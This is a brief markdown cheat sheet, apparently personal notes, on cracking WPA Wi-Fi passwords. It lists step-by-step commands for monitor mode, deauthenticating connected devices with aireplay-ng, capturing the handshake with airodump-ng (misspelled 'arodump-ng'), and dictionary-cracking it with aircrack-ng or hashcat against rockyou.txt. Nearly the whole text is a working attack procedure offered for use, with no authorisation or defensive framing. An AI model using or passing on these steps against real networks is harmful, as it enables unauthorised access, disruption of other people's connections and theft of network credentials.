# Wireless excess point cracking:

### Putting wireless card into monitor mode

- iwconfig : to check the card
- ifconfig (cardname) down
- iwconfig (cardname) mode monitor
- ifconfig (cardname) up

### Deauthenticated devices and grabbing password

- airmon-ng check (cardname)
- airmon-ng check kill
- put it monitor mode again
- arodump-ng (cardname)
- arodump-ng -c (channel id) --bssid
  (mac) -w (filename) (cardname)
- aireplay-ng -0 0 -a (mac-id) (cardname)
- you only need wpa handshake and .cap file

### Aircrack password cracking

- locate rockyou.txt
- cd to it
- cp rockyou.txt.gz /home/asynccat/Desktop
- gzip -d rockyou.txt.gz
- aircrack-ng -w rockyou.txt (.cap file)

### Hashcat password cracking

- convert .cap file to .hccapx
- hashcat -a 0 -m 2500 (.hccapx) rockyou.txt
